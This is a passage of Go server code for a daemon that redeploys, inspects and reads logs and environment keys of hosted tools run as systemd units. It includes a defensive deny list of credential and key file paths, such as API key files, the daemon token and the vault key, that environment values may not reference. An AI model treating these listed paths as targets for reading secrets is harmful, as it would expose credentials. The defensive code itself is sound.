		"VIBECRAFT_MANAGER_REASONING_EFFORT",
		"VIBECRAFT_MANAGER_MAX_OUTPUT_TOKENS",
		"VIBECRAFT_MANAGER_DEEP_REASONING_EFFORT",
		"VIBECRAFT_MANAGER_DEEP_MAX_OUTPUT_TOKENS",
		"VIBECRAFT_AI_PROXY_URL",
		"VIBECRAFT_AI_CREDITS_TOKEN",
		"VIBECRAFT_DAEMON_TOKEN":
		return true
	}
	return strings.HasPrefix(key, "AWS_")
}

func appServiceReservedEnvValue(v string) bool {
	for _, needle := range []string{
		"/etc/vibecraft/openai.key",
		"/etc/vibecraft/anthropic.key",
		"/etc/vibecraft/daemon.token",
		"/etc/vibecraft/local.token",
		"/etc/vibecraft/encryption.key",
		"/etc/vibecraft/vault.key",
		"/etc/vibecraft/health.token",
		"/var/lib/cloud/",
	} {
		if strings.Contains(v, needle) {
			return true
		}
	}
	return false
}

func indexByte(s string, b byte) int {
	for i := 0; i < len(s); i++ {
		if s[i] == b {
			return i
		}
	}
	return -1
}

// ---------------------------------------------------------------------------
// Operator-/CLI-facing hosted-tool lifecycle: deploy, status, logs, env.
//
// These live on /api/hosted-apps/<name>/<action> (withCookieOrBearer) — the
// same auth surface as restart. They are the deterministic "update a deployed
// tool" loop an outside agent needs: status -> (edit + rebuild in the task
// shell, which shares the host filesystem) -> deploy -> verify "now serving".
//
// Security boundary: every action requires an EXISTING route (404 otherwise)
// and deploy REUSES the unit's stored ExecStart — the CLI cannot set an
// arbitrary command, so this adds no RCE surface beyond restart. Creating a
// new tool and setting ExecStart stays manager-only via install-app-service
// (localhost). See the plan: plans/seamless-tool-deploy.md.
// ---------------------------------------------------------------------------

// portStatusProbe is the short dial budget for the read-only `status` port
// check. Unlike deploy (which waits portListenTimeout for a cold start), a
// status read just wants the current truth, so it probes briefly.
const portStatusProbe = 1500 * time.Millisecond

// parsedUnit is what we recover from an already-written unit file so a
// redeploy can reuse the stored shape without the caller re-sending it.
type parsedUnit struct {
	ExecStart        string
	WorkingDirectory string
	Description      string
	Environment      []string // verbatim KEY=VALUE lines
}

// parseUnitFile reads the fields renderUnitFile wrote. Tolerant by design:
// it ignores comments, blank lines, and section headers, and only extracts
// the four directives we round-trip.
//
// Environment now lives in the sibling 0600 EnvironmentFile (secrets stay
// out of the 0644 unit), so we resolve that file and read the KEY=VALUE
// lines from it. Legacy inline `Environment=` directives (units written
// by an older daemon, before the EnvironmentFile split) are still parsed
// so a redeploy of an existing tool keeps working across the rollout.
func parseUnitFile(path string) (parsedUnit, error) {
	var pu parsedUnit
	b, err := os.ReadFile(path)
	if err != nil {
		return pu, err
	}
	name := strings.TrimSuffix(filepath.Base(path), ".service")
	if name == "" || name == filepath.Base(path) || !systemNamePattern.MatchString(name) {
		return pu, fmt.Errorf("invalid unit file name %q", filepath.Base(path))
	}
	expectedEnvFile := filepath.Clean(appServiceEnvFilePath(name))
	var envFile string
	for _, line := range strings.Split(string(b), "\n") {
		t := strings.TrimSpace(line)
		switch {
		case t == "" || strings.HasPrefix(t, "#"):
			continue
		case strings.HasPrefix(t, "Description="):
			pu.Description = strings.TrimPrefix(t, "Description=")
		case strings.HasPrefix(t, "WorkingDirectory="):
			pu.WorkingDirectory = strings.TrimPrefix(t, "WorkingDirectory=")
		case strings.HasPrefix(t, "ExecStart="):
			pu.ExecStart = strings.TrimPrefix(t, "ExecStart=")
		case strings.HasPrefix(t, "EnvironmentFile="):
			// Strip the optional `-` (= "ok if missing") prefix systemd
			// allows. Only the sibling sidecar rendered by this daemon is
			// trusted; otherwise a user-edited unit could make the root
			// daemon read arbitrary EnvironmentFile= targets during status
			// or redeploy.
			candidate := filepath.Clean(strings.TrimPrefix(strings.TrimPrefix(t, "EnvironmentFile="), "-"))
			if candidate != expectedEnvFile {
				return pu, fmt.Errorf("unexpected EnvironmentFile path %q in %s", candidate, path)
			}
			envFile = candidate
		case strings.HasPrefix(t, "Environment="):
			// Legacy inline form — kept for backward compatibility.
			pu.Environment = append(pu.Environment, strings.TrimPrefix(t, "Environment="))
		}
	}
	if envFile != "" {
		env, err := readEnvFile(envFile)
		if err != nil {
			return pu, err
		}
		pu.Environment = append(pu.Environment, env...)
	}
	return pu, nil
}

// readEnvFile loads KEY=VALUE lines from a unit's EnvironmentFile. Best
// effort: a missing file (the unit used `EnvironmentFile=-`) yields nil,
// not an error — callers treat absent env as "none." Comments and blank
// lines are skipped to mirror systemd's own parser.
func readEnvFile(path string) ([]string, error) {
	if err := rejectSymlinkPath(path); err != nil {
		return nil, err
	}
	b, err := os.ReadFile(path)
	if err != nil {
		if os.IsNotExist(err) {
			return nil, nil
		}
		return nil, err
	}
	var out []string
	for _, line := range strings.Split(string(b), "\n") {
		t := strings.TrimSpace(line)
		if t == "" || strings.HasPrefix(t, "#") {
			continue
		}
		out = append(out, t)
	}
	return out, nil
}

// envKeys returns the KEY half of each KEY=VALUE line. Used everywhere we
// expose environment to the operator — values are NEVER returned over the
// network (a unit file holds already-resolved secret values).
func envKeys(env []string) []string {
	keys := make([]string, 0, len(env))
	for _, kv := range env {
		kv = strings.TrimSpace(kv)
		if kv == "" {
			continue
		}
		if i := indexByte(kv, '='); i > 0 {
			keys = append(keys, kv[:i])
		}
	}
	return keys
}

// stripReservedInjectedEnv drops VibeCraft-managed env entries (the AI proxy
// vars, etc.) from a unit's stored environment before a redeploy. They are
// re-injected fresh by doInstallAppService — keeping a stale copy would (a)
// fail validateAppServiceEnvironment and (b) pin a possibly-rotated token.
func stripReservedInjectedEnv(env []string) []string {
	out := make([]string, 0, len(env))
	for _, kv := range env {
		kv = strings.TrimSpace(kv)
		if kv == "" {
			continue
		}
		i := indexByte(kv, '=')
		if i <= 0 {
			continue
		}
		if appServiceReservedEnvName(kv[:i]) {
			continue
		}
		out = append(out, kv)
	}
	return out
}

// mergeEnv overlays `override` onto `base` by KEY, preserving base order and
// appending override-only keys after. Provided values win.
func mergeEnv(base, override []string) []string {
	ov := map[string]string{}
	for _, kv := range override {
		kv = strings.TrimSpace(kv)
		if kv == "" {
			continue
		}
		if i := indexByte(kv, '='); i > 0 {
			ov[kv[:i]] = kv
		}
	}
	seen := map[string]bool{}
	result := make([]string, 0, len(base)+len(override))
	for _, kv := range base {
		kv = strings.TrimSpace(kv)
		if kv == "" {
			continue
		}
		i := indexByte(kv, '=')
		if i <= 0 {
			continue
		}
		k := kv[:i]
		if seen[k] {
			continue
		}
		seen[k] = true
		if repl, ok := ov[k]; ok {
			result = append(result, repl)
		} else {
			result = append(result, kv)
		}
	}
	for _, kv := range override {
		kv = strings.TrimSpace(kv)
		if kv == "" {
			continue
		}
		i := indexByte(kv, '=')
		if i <= 0 {
			continue
		}
		k := kv[:i]
		if seen[k] {
			continue
		}
		seen[k] = true
		result = append(result, kv)
	}
	return result
}

// systemdUserShow returns the requested unit properties as a map. Best-effort:
// an error (no such unit, no user bus) yields an empty map, not a failure —
// callers treat absent keys as "unknown."
func systemdUserShow(ctx context.Context, uid, runtimeDir, unit string, props ...string) map[string]string {
	args := []string{"--user", "show", unit}
	for _, p := range props {
		args = append(args, "--property="+p)
	}
	out, err := runAsVibecraftUserFn(ctx, uid, runtimeDir, "systemctl", args...)
	m := map[string]string{}
	if err != nil {
		return m
	}
	for _, line := range strings.Split(out, "\n") {
		k, v, ok := strings.Cut(strings.TrimSpace(line), "=")
		if ok {
			m[k] = v
		}
	}
	return m
}

// appServiceDeployResult is returned by POST /api/hosted-apps/<name>/deploy.
// Same proof-oriented shape as restart, plus the unit path.
type appServiceDeployResult struct {
	OK             bool   `json:"ok"`
	Name           string `json:"name"`
	Unit           string `json:"unit"`
	Status         string `json:"status"`
	OldPID         int    `json:"old_pid"`
	NewPID         int    `json:"new_pid"`
	Port           int    `json:"port,omitempty"`
	ListeningAfter bool   `json:"listening_after"`
	UnitPath       string `json:"unit_path,omitempty"`
	Detail         string `json:"detail,omitempty"`
}

// deployHostedAppService redeploys an EXISTING hosted tool: it reuses the
// unit's stored ExecStart/WorkingDirectory/Description, optionally updates the
// environment (provided KEY=VALUE pairs win; $SECRET refs resolve from the
// vault) and the port, then re-runs the full install path (re-render unit,
// daemon-reload, restart, prove the MainPID cycled, wait for the host port).
// This is the deterministic "apply my change" verb the CLI exposes.
func (s *Server) deployHostedAppService(ctx context.Context, name string, env []string, portOverride *int) (appServiceDeployResult, int) {
	result := appServiceDeployResult{Name: name, Unit: name + ".service", Status: "failed"}
	if !systemNamePattern.MatchString(name) {
		result.Detail = "invalid tool name"
		return result, http.StatusBadRequest
	}
	route, err := s.db.GetRoute(name)
	if err != nil {
		result.Detail = "hosted tool route not found — create it via the manager first"
		return result, http.StatusNotFound
	}

	unitPath := filepath.Join(systemdUserDir, name+".service")
	pu, err := parseUnitFile(unitPath)
	if err != nil {
		result.Detail = fmt.Sprintf("reading unit file %s: %v — redeploy needs an existing unit; create the tool via the manager first", unitPath, err)
		return result, http.StatusConflict
	}
	if strings.TrimSpace(pu.ExecStart) == "" {
		result.Detail = "unit has no ExecStart — cannot redeploy; recreate the tool via the manager"
		return result, http.StatusConflict
	}

	// Validate caller-provided env (reserved keys/paths) before resolution so
	// a clean 400 explains the rejection instead of a downstream systemd error.
	if err := validateAppServiceEnvironment(env); err != nil {
		result.Detail = err.Error()
		return result, http.StatusBadRequest
	}

	// Resolve $SECRET references in the CALLER-PROVIDED overrides ONLY, then
	// overlay them on the stored env. The stored values were already
	// vault-resolved at install time and are literal secret values — running
	// the resolver over them again would silently rewrite any stored literal
	// that happens to contain a `$NAME` token colliding with a vault secret
	// name (e.g. a signing key like `xK$SESSION9f...` when a SESSION secret
	// exists), corrupting the running app's config with no error surfaced.
	// Resolve overrides first, merge second, so stored literals pass through
	// verbatim.
	resolver := vault.NewResolver(s.vaultStore)
	resolvedOverride := make([]string, 0, len(env))
	for _, kv := range env {
		resolvedOverride = append(resolvedOverride, resolver.ResolveEnvLine(kv))
	}
	resolved := mergeEnv(stripReservedInjectedEnv(pu.Environment), resolvedOverride)

	port := route.Port
	if portOverride != nil {
		if *portOverride != route.Port {
			result.Detail = fmt.Sprintf("port override %d does not match registered route port %d; update the route first", *portOverride, route.Port)
			return result, http.StatusBadRequest
		}
		port = *portOverride
	}

	req := installAppServiceRequest{
		Name:             name,
		ExecStart:        pu.ExecStart,
		WorkingDirectory: pu.WorkingDirectory,
		Description:      pu.Description,
		Port:             port,
		Environment:      resolved,
	}
	installResult, err := s.doInstallAppService(ctx, req)
	if err != nil {
		result.Detail = err.Error()
		return result, http.StatusInternalServerError
	}
	result.Status = installResult.Status
	result.OldPID = installResult.OldPID
	result.NewPID = installResult.NewPID
	result.Port = port
	result.ListeningAfter = installResult.ListeningAfter
	result.UnitPath = installResult.UnitPath
	result.Detail = installResult.Detail
	result.OK = installResult.Status == "running" || (port == 0 && installResult.Status == "started")
	return result, http.StatusOK
}

// hostedAppStatusResult is what the operator sees for "what is actually
// running": the route, the unit's stored shape, env KEYS (never values),
// live systemd state + MainPID, whether the host port is listening, and the
// working copy's git HEAD (so "is the running build current?" is answerable).
type hostedAppStatusResult struct {
	Name             string   `json:"name"`
	Unit             string   `json:"unit"`
	Port             int      `json:"port"`
	URL              string   `json:"url,omitempty"`
	SSOEnabled       bool     `json:"sso_enabled"`
	CreatedAt        string   `json:"created_at,omitempty"`
	UnitPresent      bool     `json:"unit_present"`
	ExecStart        string   `json:"exec_start,omitempty"`
	WorkingDirectory string   `json:"working_directory,omitempty"`
	Description      string   `json:"description,omitempty"`
	EnvKeys          []string `json:"env_keys"`
	ActiveState      string   `json:"active_state,omitempty"`
	SubState         string   `json:"sub_state,omitempty"`
	MainPID          int      `json:"main_pid"`
	Listening        bool     `json:"listening"`
	Since            string   `json:"since,omitempty"`
	GitCommit        string   `json:"git_commit,omitempty"`
	GitDirty         bool     `json:"git_dirty,omitempty"`
	Detail           string   `json:"detail,omitempty"`
}

func (s *Server) hostedAppStatus(ctx context.Context, name string) (hostedAppStatusResult, int) {
	res := hostedAppStatusResult{Name: name, Unit: name + ".service", EnvKeys: []string{}}
	if !systemNamePattern.MatchString(name) {
		res.Detail = "invalid tool name"
		return res, http.StatusBadRequest
	}
	route, err := s.db.GetRoute(name)
	if err != nil {
		res.Detail = "hosted tool route not found"
		return res, http.StatusNotFound
	}
	res.Port = route.Port
	res.SSOEnabled = route.SSOEnabled
	res.CreatedAt = route.CreatedAt
	if s.routeMgr != nil {
		res.URL = s.routeMgr.URL(name)
	}

	unitPath := filepath.Join(systemdUserDir, name+".service")
	if pu, err := parseUnitFile(unitPath); err == nil {
		res.UnitPresent = true
		res.ExecStart = pu.ExecStart
		res.WorkingDirectory = pu.WorkingDirectory
		res.Description = pu.Description
		res.EnvKeys = envKeys(pu.Environment)
	}

	if uid, runtimeDir, err := vibecraftRuntimeContextFn(); err == nil {
		props := systemdUserShow(ctx, uid, runtimeDir, res.Unit,
			"MainPID", "ActiveState", "SubState", "ExecMainStartTimestamp")
		res.MainPID, _ = strconv.Atoi(strings.TrimSpace(props["MainPID"]))
		res.ActiveState = props["ActiveState"]
		res.SubState = props["SubState"]
		res.Since = props["ExecMainStartTimestamp"]
		// Working-copy git state (best-effort; absent for non-git dirs).
		if res.WorkingDirectory != "" {
			if out, err := runAsVibecraftUserFn(ctx, uid, runtimeDir, "git", "-C", res.WorkingDirectory, "rev-parse", "--short", "HEAD"); err == nil {
				res.GitCommit = strings.TrimSpace(out)
				if st, err := runAsVibecraftUserFn(ctx, uid, runtimeDir, "git", "-C", res.WorkingDirectory, "status", "--porcelain"); err == nil {
					res.GitDirty = strings.TrimSpace(st) != ""
				}
			}
		}
	} else {
		res.Detail = err.Error()
	}

	res.Listening = waitForLocalPortFn(ctx, route.Port, portStatusProbe)
	return res, http.StatusOK
}

// hostedAppLogsResult carries the tail of a tool's journal. Lines are the
// raw journalctl output (short-iso), one entry per line.
type hostedAppLogsResult struct {
	Name   string   `json:"name"`
	Unit   string   `json:"unit"`
	Lines  []string `json:"lines"`
	Detail string   `json:"detail,omitempty"`
}

func (s *Server) hostedAppLogs(ctx context.Context, name string, n int) (hostedAppLogsResult, int) {
	res := hostedAppLogsResult{Name: name, Unit: name + ".service", Lines: []string{}}
	if !systemNamePattern.MatchString(name) {
		res.Detail = "invalid tool name"
		return res, http.StatusBadRequest
	}
	if _, err := s.db.GetRoute(name); err != nil {
		res.Detail = "hosted tool route not found"
		return res, http.StatusNotFound
	}
	if n <= 0 {
		n = 100
	}
	if n > 1000 {
		n = 1000
	}
	uid, runtimeDir, err := vibecraftRuntimeContextFn()
	if err != nil {
		res.Detail = err.Error()
		return res, http.StatusOK
	}
	out, err := runAsVibecraftUserFn(ctx, uid, runtimeDir, "journalctl",
		"--user", "-u", res.Unit, "-n", strconv.Itoa(n), "--no-pager", "-o", "short-iso")
	if err != nil {
		res.Detail = fmt.Sprintf("journalctl: %v\n%s", err, out)
		return res, http.StatusOK
	}
	for _, line := range strings.Split(strings.TrimRight(out, "\n"), "\n") {
		res.Lines = append(res.Lines, line)
	}
	return res, http.StatusOK
}

// hostedAppEnvKey is one environment variable the tool runs with. Value is
// never included — a unit file holds already-resolved secret values.
type hostedAppEnvKey struct {
	Key      string `json:"key"`
	Reserved bool   `json:"reserved"` // VibeCraft-managed (AI proxy, etc.)
}

type hostedAppEnvResult struct {
	Name   string            `json:"name"`
	Unit   string            `json:"unit"`
	Keys   []hostedAppEnvKey `json:"keys"`
	Detail string            `json:"detail,omitempty"`
}

func (s *Server) hostedAppEnv(name string) (hostedAppEnvResult, int) {
	res := hostedAppEnvResult{Name: name, Unit: name + ".service", Keys: []hostedAppEnvKey{}}
	if !systemNamePattern.MatchString(name) {
		res.Detail = "invalid tool name"
		return res, http.StatusBadRequest
	}
	if _, err := s.db.GetRoute(name); err != nil {
		res.Detail = "hosted tool route not found"
		return res, http.StatusNotFound
	}
	unitPath := filepath.Join(systemdUserDir, name+".service")
	pu, err := parseUnitFile(unitPath)
	if err != nil {
		res.Detail = fmt.Sprintf("reading unit file %s: %v", unitPath, err)
		return res, http.StatusOK
	}
	for _, k := range envKeys(pu.Environment) {
		res.Keys = append(res.Keys, hostedAppEnvKey{Key: k, Reserved: appServiceReservedEnvName(k)})
	}
	return res, http.StatusOK
}
